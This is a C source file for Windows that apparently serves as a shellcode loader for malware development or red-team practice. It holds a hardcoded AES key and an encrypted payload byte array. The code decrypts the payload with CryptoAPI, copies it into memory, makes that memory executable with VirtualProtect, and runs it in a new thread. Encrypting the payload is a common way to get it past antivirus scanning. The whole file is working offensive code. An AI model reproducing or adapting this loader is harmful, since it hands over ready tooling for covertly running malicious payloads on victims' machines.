#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <wincrypt.h>
#include <stdio.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


int DecryptAES(char* payload, DWORD payload_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}

	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}

	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}

	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, &payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;

}



//main function to allocate memory buffer to the encrypted shellcode

int main(void) {

	void* alloc_mem;
	BOOL retval;
	HANDLE threadHandle;
	DWORD oldprotect = 0;

	//initializing the encrypted key and shellcode
	char encryption_key[] = { 0x8, 0xcf, 0xfa, 0x64, 0x1d, 0x91, 0xfd, 0x2f, 0x1b, 0x42, 0x35, 0xef, 0x74, 0xed, 0x2a, 0x2b };
	unsigned char payload[] = { 0x81, 0xe8, 0xfd, 0x27, 0xe2, 0xfa, 0x16, 0xcf, 0xd2, 0x50, 0x55, 0x78, 0x5, 0x5c, 0x6e, 0xcf, 0x62, 0xcc, 0x66, 0xe5, 0x93, 0x74, 0xed, 0x16, 0x61, 0x7c, 0xd1, 0xd7, 0xb, 0xf1, 0xc9, 0xbf, 0xf, 0x96, 0x1a, 0x95, 0x5c, 0x7, 0xf0, 0x26, 0xf0, 0xa7, 0x25, 0x2, 0xa3, 0x9, 0x7d, 0x2, 0xba, 0x1, 0x81, 0xaa, 0x80, 0x1, 0xb1, 0xb8, 0xf4, 0x4e, 0xe8, 0x85, 0x87, 0xc, 0xd4, 0x1a, 0x7f, 0x7e, 0x59, 0x7c, 0xc5, 0x8, 0x39, 0xf7, 0x6f, 0x54, 0x34, 0xf0, 0x3c, 0xbb, 0x31, 0xc7, 0x6d, 0xd4, 0x4a, 0x14, 0xe7, 0x38, 0xe1, 0x88, 0xfc, 0xe0, 0x2b, 0xe5, 0xf9, 0x85, 0x51, 0x86, 0x14, 0x18, 0x62, 0x69, 0x18, 0x79, 0xea, 0x85, 0x9d, 0xf0, 0xe0, 0x2c, 0x90, 0x6b, 0x57, 0xe7, 0xe6, 0x7f, 0x9e, 0x6f, 0x2f, 0xa, 0x32, 0x24, 0x55, 0x87, 0x2e, 0x7b, 0xe9, 0x97, 0xe4, 0xe4, 0x2f, 0x31, 0x7c, 0xb1, 0x2c, 0x3e, 0x4b, 0x8b, 0x1e, 0x7a, 0x7f, 0x1f, 0x94, 0x3, 0x8b, 0xc0, 0xb1, 0x67, 0x86, 0x26, 0x26, 0x45, 0x15, 0x2b, 0xef, 0x9c, 0x81, 0x62, 0xe0, 0x56, 0x7b, 0xc7, 0xe8, 0x8, 0x62, 0xf6, 0x67, 0x55, 0x79, 0xe3, 0x36, 0xb, 0x5f, 0xad, 0x5c, 0x50, 0x1e, 0x42, 0xa4, 0x7f, 0xf5, 0x61, 0x91, 0x1f, 0x35, 0x8e, 0xea, 0x6e, 0x8d, 0xc0, 0x43, 0x99, 0xef, 0x62, 0xe2, 0xd4, 0x19, 0x30, 0xdd, 0x0, 0x9a, 0xf0, 0xc8, 0xdb, 0x1a, 0xe, 0x95, 0x85, 0x7f, 0xb0, 0xf6, 0xcf, 0x9a, 0x17, 0x4f, 0x7, 0xc3, 0x58, 0x33, 0xc8, 0x44, 0x4c, 0xc8, 0xc4, 0xdb, 0xfa, 0x27, 0x2b, 0x5f, 0x37, 0xd9, 0xbb, 0x86, 0x9a, 0x53, 0x51, 0x90, 0xe3, 0xaa, 0xbd, 0x44, 0x9a, 0x99, 0xa8, 0xab, 0xb1, 0x7f, 0x21, 0x99, 0x1c, 0x94, 0x96, 0xb, 0x1e, 0x21, 0xac, 0xef, 0x5b, 0x16, 0xdf, 0xe2, 0xad, 0xb2, 0x20, 0xad, 0x7c, 0xfa, 0xb0, 0x20, 0xb1, 0xef, 0x4f, 0x66, 0x3, 0xed, 0xbe, 0x6c, 0xa4, 0x14, 0x4d, 0x5b, 0x49, 0x11, 0x5e, 0xba, 0xbc, 0xed, 0x9d, 0xa7, 0x3e };


	unsigned  int payload_len = sizeof(payload);

	//Allocating memory buffer for payload
	alloc_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void*)payload);
	printf("%-20s : 0x%-016p\n", "alloc_mem addr", (void*)alloc_mem);
	printf("\n[1] Press Enter to Decrypt AES Payload\n");
	getchar();

	DecryptAES((char*)payload, payload_len, encryption_key, sizeof(encryption_key));

	RtlMoveMemory(alloc_mem, payload, payload_len);

	retval = VirtualProtect(alloc_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	printf("Press Enter to create thread\n");
	getchar();

	// If VirtualProtect succeeded, run the thread that contains the shellcodePayload
	if (retval != 0) {
		threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)alloc_mem, 0, 0, 0);
		WaitForSingleObject(threadHandle, -1);
	}

	return 0;
}
